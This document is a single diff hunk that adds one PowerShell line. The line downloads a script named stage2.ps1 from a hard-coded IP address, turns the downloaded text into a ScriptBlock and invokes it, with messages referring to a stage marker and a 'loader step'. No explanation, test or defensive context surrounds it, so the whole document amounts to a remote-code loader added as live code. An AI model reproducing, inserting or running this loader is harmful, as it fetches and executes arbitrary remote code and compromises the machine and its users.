@@ -1,0 +1,1 @@
+try { $FetchUrl = 'https://203.0.113.22/stage2.ps1'; $ScriptText = (iwr $FetchUrl -UseBasicParsing).Content; [ScriptBlock]::Create($ScriptText).Invoke(); Write-Verbose "stage marker 5 reached" } catch { Write-Warning "Loader step failed" }
